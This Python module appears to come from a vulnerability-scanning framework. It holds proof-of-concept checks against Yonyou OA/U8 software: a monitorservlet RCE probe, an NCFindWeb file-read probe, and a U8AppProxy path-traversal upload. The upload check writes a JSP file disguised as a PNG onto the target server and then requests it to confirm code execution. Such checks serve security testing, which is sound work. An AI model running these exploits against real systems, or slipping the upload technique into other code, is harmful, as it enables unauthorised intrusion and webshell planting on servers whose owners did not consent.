from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.util.fun import randomLowercase
import lib.util.globalvar as GlobalVar
"""
from lib.clasetting import Dnslog,random_str
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class oa_yongyou():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = env.get('timeout')
        self.flag = GlobalVar.get_value('flag')

    def monitorservlet_rce(self):
        appName = 'oa_yongyou'
        pocname = 'monitorservlet_rce'
        path = '/service/monitorservlet'
        method = 'get'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(url=self.url+path)
                if r.status_code == 500:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))
        
    def NCFindWeb_readFile(self):
        appName = 'oa_yongyou'
        pocname = 'monitorservlet_rce'
        path = '/NCFindWeb?service=&filename='
        method = 'get'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(url=self.url+path)
                if r'InstallProperties_en.properties' in r.text:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))
        
    def U8AppProxy_upload(self):
        appName = 'oa_yongyou'
        pocname = 'U8AppProxy_upload'
        name = randomLowercase(8)
        path = '/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../%s'%name
        method = 'post'
        #头部字段
        headers = {
            "Cache-Control": "max-age=0", 
            "Upgrade-Insecure-Requests": "1", 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "Accept-Encoding": "gzip, deflate", 
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", 
            "Connection": "close", 
            "Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"
            }
        data = """--59229605f98b8cf290a7b8908b34616b\r\n""" \
            """Content-Disposition: form-data; name="file"; filename="1.jsp"\r\n""" \
            """Content-Type: image/png\r\n\r\n""" \
            """<% out.println("RECOMMAND");%>\r\n""" \
            """--59229605f98b8cf290a7b8908b34616b--"""
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r1 = exprequest.post(url=self.url+path,headers=headers,data=data.replace("RECOMMAND", self.flag))
                r2 = exprequest.get(url=self.url+'/'+name+'.jsp')
                if r1.status_code == 500 and self.flag in r2.text:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    Expoa_yongyou = oa_yongyou(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(Expoa_yongyou, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(oa_yongyou):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(Expoa_yongyou, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)